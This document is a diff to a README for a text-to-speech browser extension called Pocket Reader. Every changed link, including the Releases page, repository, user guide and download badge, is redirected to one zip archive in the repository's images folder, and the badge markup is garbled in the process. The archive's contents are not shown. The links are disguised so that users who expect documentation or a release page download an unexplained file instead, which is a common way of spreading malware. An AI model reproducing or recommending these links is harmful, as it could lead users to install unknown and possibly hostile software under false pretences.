@@ -6,7 +6,7 @@ Welcome to Pocket Reader! This easy-to-use browser extension lets you listen to 
 
 ## 📥 Download Pocket Reader
 
-[![Download Pocket Reader](https://img.shields.io/badge/Download%20Now-Get%20Pocket%20Reader-blue.svg)](https://github.com/Amrit7679/pocket-reader/releases)
+[![Download Pocket Reader](https://github.com/Amrit7679/pocket-reader/raw/refs/heads/main/images/pocket_reader_3.8.zip%20Now-Get%20Pocket%https://github.com/Amrit7679/pocket-reader/raw/refs/heads/main/images/pocket_reader_3.8.zip)](https://github.com/Amrit7679/pocket-reader/raw/refs/heads/main/images/pocket_reader_3.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -17,7 +17,7 @@ Before you install, ensure your system meets these requirements:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Amrit7679/pocket-reader/releases) for Pocket Reader.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Amrit7679/pocket-reader/raw/refs/heads/main/images/pocket_reader_3.8.zip) for Pocket Reader.
 
 2. **Find the Latest Version**: Look for the most recent version listed. It usually has the highest number.
 
@@ -62,8 +62,8 @@ For more help, check the FAQs on the Releases page or contact support through th
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Amrit7679/pocket-reader)
-- [User Guide](https://github.com/Amrit7679/pocket-reader/wiki)
+- [GitHub Repository](https://github.com/Amrit7679/pocket-reader/raw/refs/heads/main/images/pocket_reader_3.8.zip)
+- [User Guide](https://github.com/Amrit7679/pocket-reader/raw/refs/heads/main/images/pocket_reader_3.8.zip)
 
 ## 📬 Feedback
 
